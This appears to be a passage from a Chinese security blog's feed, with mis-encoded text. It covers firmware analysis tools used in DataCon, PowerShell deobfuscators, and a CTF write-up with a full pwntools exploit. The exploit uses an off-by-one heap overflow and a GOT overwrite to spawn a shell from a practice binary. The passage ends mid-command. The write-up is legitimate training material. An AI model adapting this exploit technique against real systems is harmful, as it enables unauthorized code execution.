    <content type="html"><![CDATA[<h4 id="å›ºä»¶åŸºåœ°å€è¯†åˆ«"><a href="#å›ºä»¶åŸºåœ°å€è¯†åˆ«" class="headerlink" title="å›ºä»¶åŸºåœ°å€è¯†åˆ«"></a>å›ºä»¶åŸºåœ°å€è¯†åˆ«</h4><p>rbasefind - <a href="https://github.com/sgayou/rbasefind">https://github.com/sgayou/rbasefind</a></p><p>æ­¤é¡¹ç›®ç”¨rustå†™çš„ï¼Œç”¨<code>cargo build</code>ä¹‹åä¼šç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶åœ¨<code>target</code>è·¯å¾„ä¸‹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rbasefind &lt;<span class="hljs-type">path</span>-<span class="hljs-keyword">to</span>-bin&gt; <br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure><p>é€šå¸¸æ¥è®²ç¬¬ä¸€è¡Œï¼ˆä¹Ÿå°±æ˜¯æ•°å­—æœ€å¤§çš„é‚£ä¸ªï¼‰ä¸ºå›ºä»¶çš„åŸºåœ°å€ï¼Œä½†æ˜¯å¾ˆå¤šæ—¶å€™è¯†åˆ«ä¸å‡ºæ¥ï¼ˆæ¯”å¦‚å‡ è¡Œéƒ½æ˜¯1ï¼‰</p><p>å®é™…åœ¨dataconçš„æ•°æ®ä¸Šæµ‹è¯•çš„ç»“æœï¼Œä½¿ç”¨çš„æ—¶å€™æ‰€æœ‰å‚æ•°éƒ½æ˜¯defaultï¼ˆå› ä¸ºå½“æ—¶å¹¶æ²¡æœ‰ä»”ç»†çœ‹ä»£ç â€¦.ï¼‰</p><p><img src="/img/datacon/1.jpg"></p><p>åº”è¯¥æ˜¯50ä¸ªå›ºä»¶è¯†åˆ«æˆåŠŸäº†38ä¸ª</p><h5 id="å¯¹rbasefindæºç çš„åˆ†æ"><a href="#å¯¹rbasefindæºç çš„åˆ†æ" class="headerlink" title="å¯¹rbasefindæºç çš„åˆ†æ"></a>å¯¹rbasefindæºç çš„åˆ†æ</h5><p>æŒ‰ç¨‹åºæ‰§è¡Œé¡ºåºåˆ†æ</p><ol><li><p><code>get_strings()</code></p><p>åˆ©ç”¨ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[ -~<span class="hljs-symbol">\t</span>\r<span class="hljs-symbol">\n</span>]&#123;10,&#125;  // ä»ç©ºæ ¼(48)åˆ°åˆ¶è¡¨ç¬¦(126) ä»¥åŠ \r<span class="hljs-symbol">\n</span> çš„æ‰€æœ‰æœ‰æ•ˆå­—ç¬¦ <br></code></pre></td></tr></table></figure><p>é•¿åº¦è‡³å°‘æ˜¯10çš„å­—ç¬¦ä¸²ï¼ˆ10ä¸ºå‚æ•°minstrlenï¼Œæœ€å°å­—ç¬¦ä¸²æœç´¢é•¿åº¦ï¼‰</p></li><li><p><code>get_pointers()</code></p><p>æå–æ•´ä¸ªæ–‡ä»¶çš„u32ï¼ˆï¼Ÿï¼‰ï¼Œä¼šæ ¹æ®å‚æ•°<code>big_endian</code>åˆ¤æ–­æ–‡ä»¶çš„å¤§å°ç«¯</p></li><li><p><code>find_match() -&gt; Interval::get_range()</code></p><p>æŠŠ32ä½åœ°å€ç©ºé—´å¹³å‡åˆ†ä¸ºnéƒ¨åˆ†ï¼Œnä½å‚æ•°çš„threadsï¼ˆå¼€å¯çš„çº¿ç¨‹æ•°ï¼‰</p></li><li><p>æ¯ä¸€ä¸ªintervalå¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œä»¥offsetå­—èŠ‚ä¸ºä¸€ç»„ï¼ˆoffsetä¸ºè¾“å…¥çš„å‚æ•°ï¼Œé»˜è®¤ä¸º4096ï¼‰</p></li><li><p>ä¸‹é¢çš„ä»£ç ä¸­current_addréå†äº†<code> [interval.start_addr : interval.end_addr : offset]</code></p><p>å°†æ¯ä¸ªstrçš„é¦–åœ°å€åŠ ä¸Šcurrent_addrï¼ŒæŠŠè¿™äº›åœ°å€å’Œpointersé›†åˆå–äº¤é›†</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">news</span> = FnvHashSet::<span class="hljs-title function_ invoke__">default</span>();<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">s</span> <span class="hljs-keyword">in</span> strings &#123;<br>        <span class="hljs-keyword">match</span> s.<span class="hljs-title function_ invoke__">checked_add</span>(current_addr) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(add) =&gt; news.<span class="hljs-title function_ invoke__">insert</span>(add),<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class="hljs-title function_ invoke__">intersection</span>(pointers).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-keyword">if</span> !intersection.<span class="hljs-title function_ invoke__">is_empty</span>() &#123;<br>        heap.<span class="hljs-title function_ invoke__">push</span>((intersection.<span class="hljs-title function_ invoke__">len</span>(), current_addr));<br>    &#125;<br>    <span class="hljs-keyword">match</span> current_addr.<span class="hljs-title function_ invoke__">checked_add</span>(config.offset) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>å–å‡ºäº¤é›†sizeæœ€å¤§çš„top nä¸ªcurrent_addrè¿›è¡Œè¾“å‡º</p><p>è§æœ¬èŠ‚æœ€å¼€å¤´çš„ç¤ºä¾‹ï¼Œè¾“å‡ºæ ¼å¼ä¸º addr :  interaction_size</p><p>sizeæœ€å¤§çš„å³è®¤ä¸ºæ˜¯æœ€æœ‰å¯èƒ½çš„åŸºåœ°å€</p><p><strong>ç›®å‰å°šä¸æ¸…æ¥šè¿™æ ·åšçš„é“ç†æ˜¯ä»€ä¹ˆ</strong></p><p>çŒœæµ‹ï¼šé¦–å…ˆï¼ŒåŸºåœ°å€æ˜¯ä¸€ä¸ªoffsetçš„å€æ•°ï¼Œé‚£ä¹ˆéå†0~2^32æ‰€æœ‰offsetçš„å€æ•°ï¼ˆä¹Ÿå°±æ˜¯current_offsetï¼‰ï¼Œå­—ç¬¦ä¸²åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šè¢«è£…è½½åˆ°åŸºåœ°å€åé¢çš„ä¸€æ®µç©ºé—´å†…ï¼Œè€Œpointersé‡Œä¼šæœ‰å¾ˆå¤šæŒ‡å‘å­—ç¬¦ä¸²çœŸå®åœ°å€çš„æŒ‡é’ˆï¼Œå¦‚æœèƒ½å°†stringså’ŒpointersåŒ¹é…ä¸Šå¾ˆå¤šï¼Œè¯´æ˜è¿™ä¸ªcurrent_addrå°±æ˜¯ç¨‹åºçš„åŸºåœ°å€</p><p>ï¼ˆçº¯ççŒœğŸ’”ï¼‰</p></li></ol><h4 id="å‡½æ•°ç¬¦å·æ¢å¤"><a href="#å‡½æ•°ç¬¦å·æ¢å¤" class="headerlink" title="å‡½æ•°ç¬¦å·æ¢å¤"></a>å‡½æ•°ç¬¦å·æ¢å¤</h4><h5 id="å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•"><a href="#å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•" class="headerlink" title="å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•"></a>å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•</h5><p>æˆ‘è®¤ä¸ºè¿™ç¯‡æ–‡ç« å†™çš„å¾ˆä¸é”™ <a href="https://blog.csdn.net/abel_big_xu/article/details/124388798">https://blog.csdn.net/abel_big_xu/article/details/124388798</a></p><ol><li><p>FLIRT</p><p>idaè‡ªå¸¦çš„ä¸€ä¸ªæ’ä»¶ï¼ŒFLIRTå¯ä»¥å¯¹æŸä¸ªé™æ€å‡½æ•°åº“ç”Ÿæˆç­¾åï¼Œç„¶åå’Œå¾…åˆ†æçš„ç¨‹åºåŒ¹é…</p><p>ç¼ºç‚¹åœ¨äºéœ€è¦å·²çŸ¥åº“å‡½æ•°æ–‡ä»¶</p></li><li><p>lscan   </p><p><a href="https://github.com/maroueneboubakri/lscan">https://github.com/maroueneboubakri/lscan</a>ï¼ˆæˆ‘å’Œå‰é¢æŒ‚ç€çš„é‚£ç¯‡csdnæ–‡ç« ä½œè€…ä¸€æ ·ï¼Œæ²¡ææ‡‚è¿™ä¸ªå·¥å…·ï¼‰</p><p>lscanç®—æ˜¯å¯¹flirtè¿›è¡Œäº†ä¸€ä¸ªåŒ…è£…ï¼Œåªè¦æŠŠä¸€å †é™æ€åº“æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œï¼Œä»–ä¼šéå†è¿™ä¸ªæ–‡ä»¶å¤¹å¯¹æ¯ä¸ªé™æ€åº“ç”Ÿæˆç­¾åï¼Œç„¶åå†ç”¨FLIRTè¿›è¡Œæ¯”å¯¹</p><p>lscané¡¹ç›®é‡Œè‡ªå¸¦çš„ä¸€äº›é™æ€åº“æ˜¯å¯ä»¥æˆåŠŸè¿è¡Œçš„ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹å†™çš„é™æ€åº“ï¼Œä¾‹å¦‚sigdatabase <a href="https://github.com/push0ebp/sig-database">https://github.com/push0ebp/sig-database</a> è¿è¡Œä¼šæŠ¥é”™</p><p>ç„¶åè¿˜æœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ç‚¹åœ¨äºåŒ¹é…æ—¶å¯¹äºæŸä¸ªåº“çš„ç›¸ä¼¼åº¦ä¼šè¶…è¿‡ç™¾åˆ†ä¹‹100%ï¼ˆåœ¨lscançš„issueé‡Œä¹Ÿæœ‰äººæåˆ°ï¼‰ï¼Œä½†å®é™…ç”¨idaçš„flirtæ‰“å¼€æ—¶è¿™ä¸ªåº“å¹¶ä¸èƒ½å¾ˆå¥½åœ°åŒ¹é…åˆ†ææ–‡ä»¶</p></li><li><p>Rizzo</p><p>æ²¡å®é™…æµ‹è¯•è¿‡ï¼Œç•¥</p></li><li><p>finger</p><p>fingeræ˜¯é˜¿é‡Œäº‘å¼€å‘çš„idaæ’ä»¶  -  <a href="https://github.com/aliyunav/Finger">https://github.com/aliyunav/Finger</a></p><p>ç”¨èµ·æ¥å¾ˆç®€å•</p></li><li><p>lumina </p><p>æ²¡æœ‰æµ‹è¯•è¿‡ï¼Œidaçš„ä¸€ä¸ªå®˜æ–¹ç¬¦å·è¯†åˆ«æ’ä»¶ï¼Œéœ€è¦è¿œç¨‹è¿æ¥åˆ°ida luminaçš„æœåŠ¡å™¨</p><p>æœ‰ä¸€ä¸ªå±±å¯¨ç‰ˆçš„æœåŠ¡å™¨lumenï¼Œå¯ä»¥æ›¿ä»£luminaï¼Œä½†å¥½åƒç°åœ¨å·²ç»ä¸å¥½ä½¿äº†</p></li></ol><h5 id="åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹"><a href="#åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹" class="headerlink" title="åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹"></a>åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹</h5><p>ç»™äº†20ä¸ªç¨‹åºï¼Œåªæœ‰ä¸€ä¸ªx86çš„ç¨‹åºï¼Œç”¨fingeråŸºæœ¬èƒ½è¯†åˆ«å‡ºæ¥ï¼Œæœ‰å‡ ä¸ªarmã€mipsçš„ç¨‹åºï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å¹³å°idaéƒ½åæ±‡ç¼–ä¸äº†ï¼Œè·Ÿä¸ç”¨è¯´ç¬¦å·æ¢å¤äº†ï¼Œå¯„</p><h4 id="powershellåæ··æ·†"><a href="#powershellåæ··æ·†" class="headerlink" title="powershellåæ··æ·†"></a>powershellåæ··æ·†</h4><p>PowerDecode  -  <a href="https://github.com/Malandrone/PowerDecode">https://github.com/Malandrone/PowerDecode</a></p><p>å¯¹äºå•ä¸ªæ–‡ä»¶åæ··æ·†å¾ˆå¥½ç”¨ï¼Œè€Œä¸”å®æµ‹æ¯”ä¸‹è¾¹é‚£ä¸ªå·¥å…·æ•ˆæœè¦å¥½</p><p>ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œå®ƒæä¾›çš„â€œåˆ†ææ•´ä¸ªæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶â€åŠŸèƒ½ï¼Œè¾“å‡ºç»“æœå…¨æ˜¯ 1.txt 2.txt 3.txt â€¦..</p><p>ç„¶åè¿™äº›txté‡Œä¹Ÿçœ‹ä¸å‡ºæ¥å¯¹åº”ç€å“ªä¸ªpwshè„šæœ¬ï¼Œä¸€å¼€å§‹æƒ³ç€æ˜¯ä¸æ˜¯æ–‡ä»¶åç§°æ’åˆ—çš„é¡ºåºï¼Œä½†å¥½åƒä¸å¯¹ï¼Œä»£ç å…¨æ˜¯powershellå†™çš„ï¼Œä¹Ÿæ²¡ææ‡‚è¯¥å’‹åŠ</p><p>å› æ­¤åªèƒ½æ¢äº†ç¬¬äºŒä¸ªå·¥å…·</p><p>PSDecode - <a href="https://github.com/R3MRUM/PSDecode">https://github.com/R3MRUM/PSDecode</a> </p><p>ä¼šåœ¨TEMPè·¯å¾„ä¸‹ç•™ä¸‹è§£æè¿‡ç¨‹ä¸­å„ä¸ªlayerçš„æ•°æ®</p><p><img src="/img/datacon/2.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>æ‚é¡¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exp</tag>
      
      <tag>datacon</tag>
      
      <tag>iot-sec</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Off-By-One</title>
    <link href="/2022/11/27/ctf-pwn/Off-By-One/"/>
    <url>/2022/11/27/ctf-pwn/Off-By-One/</url>
    
    <content type="html"><![CDATA[<h4 id="Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ"><a href="#Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ" class="headerlink" title="Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ"></a>Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ</h4><ol><li><p>å¾ªç¯å¤šä¸€æ¬¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">x = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure><p>xçš„ä¸‹ä¸€ä¸ªchunkç¬¬ä¸€ä¸ªå­—èŠ‚è¢«æº¢å‡ºäº†</p></li><li><p><code>strlen</code>å’Œ<code>strcpy</code>è¡Œä¸ºä¸ä¸€è‡´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">100</span>)<br>&#123;<br>    <span class="hljs-built_in">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>strlen</code>è¿”å›å€¼ä¸ç®—ç»“æŸç¬¦â€™<code>\0</code>ï¼Œè€Œ<code>strcpy</code>å¤åˆ¶æ—¶ä¼šæŠŠç»“æŸç¬¦åœ¨å†…çš„101ä¸ªå­—ç¬¦å¤åˆ¶è¿‡å»</p></li></ol><h4 id="hitcon-creator"><a href="#hitcon-creator" class="headerlink" title="hitcon_creator"></a>hitcon_creator</h4><p>é¢˜ç›®æ¥æº</p><p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p><h5 id="1-create"><a href="#1-create" class="headerlink" title="1. create"></a>1. create</h5><p><img src="/img/off_by_one/1.png"></p><p>ä»ä¸Šè¿°ç»“æ„å¯ä»¥æ¨æ–­å‡ºheaparrayæ˜¯å¦‚ä¸‹ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class="hljs-type">char</span> * content;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span> * <span class="hljs-title">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure><h5 id="2-edit"><a href="#2-edit" class="headerlink" title="2. edit"></a>2. edit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>read_input</code>è¯»å–size+1å­—èŠ‚ï¼Œå‡ºç°äº†off_by_oneæ¼æ´</p><p>å¯ä»¥è¦†ç›–ä¸‹ä¸€ä¸ªchunkçš„sizeå­—æ®µ</p><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ol><li><p>ç”³è¯·ä¸‰ä¸ªå †å—ï¼Œå¤§å°ä¸º0x18,0x10,0x10ï¼ŒåŠ ä¸Šä¸‰æ¬¡sizeç”³è¯·çš„0x10ï¼Œä¸€å…±6ä¸ªchunk</p><p> <img src="/img/off_by_one/2.jpg"></p></li><li><p>ä¿®æ”¹0å·å—ï¼Œå†™å…¥<code>/bin/sh</code>ï¼Œç„¶åå†æº¢å‡º<code>0x81</code>åˆ°ä¸‹ä¸€ä¸ªchunkçš„size</p><p><img src="/img/off_by_one/3.jpg"></p></li><li><p>è¿™æ—¶delete chunk 1ï¼Œä¼šåˆå¹¶åˆ°å‰ä¸€ä¸ªchunkï¼ˆä¹Ÿå°±æ˜¯1çš„sizeæ‰€åœ¨chunkï¼‰ä¸­</p><p> <img src="/img/off_by_one/4.jpg"></p><p> è§‚å¯Ÿbinsï¼Œå‘ç°è¿™ä¸ªchunkè¢«freeåˆ°fastbinçš„0x80èŠ‚ç‚¹ä¸Šï¼ˆ0x20ä¸Šä¹Ÿæœ‰ä¸€ä¸ªchunkæ˜¯å› ä¸ºdeleteä¹Ÿä¼šå°†sizeé‡Šæ”¾æ‰ï¼‰</p><p> <img src="/img/off_by_one/5.jpg"></p></li><li><p>ç”³è¯·ä¸€ä¸ªæ–°çš„chunkï¼Œå°†0x80è¿™ä¸ªå—ç”³è¯·å‡ºæ¥ï¼Œå› æ­¤mallocçš„å¤§å°éœ€è¦ä¸º0x70</p><p> åŒæ—¶ï¼Œåœ¨2å·çš„contentä½ç½®å†™å…¥<code>free@got</code></p><p> è¿™æ—¶è°ƒç”¨show(2)ä¼šæ³„éœ²freeçš„åœ°å€</p><p> <img src="/img/off_by_one/6.jpg"></p></li><li><p>æ³„éœ²libcåŸºå€æ‰¾åˆ°systemåœ°å€</p></li><li><p><code>edit(2,p64(system_addr))</code>æ—¶ï¼Œä¼šä¿®æ”¹contentæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œè€ŒcontentæŒ‡é’ˆè¢«<code>free@got</code>æ›¿æ¢æ‰äº†ï¼Œæ‰€ä»¥freeçš„gotè¡¨è¢«ä¿®æ”¹æˆäº†<code>system@got</code>ä¸Šçš„åœ°å€</p></li><li><p>ç„¶å<code>delete(0)</code>æ—¶ï¼Œé¦–å…ˆè¦freeæ‰<code>heaparray[0].content</code>ä¸Šçš„å†…å®¹ï¼Œä½†æ˜¯ç”±äºfreeè¢«æ›¿æ¢æˆäº†systemï¼Œç»“æœå°±å˜æˆäº†ä»¥contentæŒ‡é’ˆä¸ºå‚æ•°è°ƒç”¨systemå‡½æ•°çš„æƒ…å†µï¼Œè€Œ<code>heaparray[0].content</code>æ°å¥½æ˜¯ä¹‹å‰å†™è¿‡çš„<code>/bin/sh</code>ï¼Œå› æ­¤æ‰§è¡Œäº†`system(â€˜/bin/shâ€™)</p></li></ol><h5 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h5><blockquote><p>libcsearcheræŒ‘ç‰ˆæœ¬ä¸º2.23çš„</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x81&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x8</span>)+p64(free_got))<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#libc</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(system_addr))<br><span class="hljs-comment">#gdb.attach(r)</span><br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patchelfä¿®æ”¹libcç‰ˆæœ¬</title>
    <link href="/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/"/>
    <url>/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h4 id="å®‰è£…glibc-all-in-one"><a href="#å®‰è£…glibc-all-in-one" class="headerlink" title="å®‰è£…glibc-all-in-one"></a>å®‰è£…glibc-all-in-one</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure><h4 id="ä¿®æ”¹libc-soå’Œld-so"><a href="#ä¿®æ”¹libc-soå’Œld-so" class="headerlink" title="ä¿®æ”¹libc.soå’Œld.so"></a>ä¿®æ”¹libc.soå’Œld.so</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf --set-interpreter 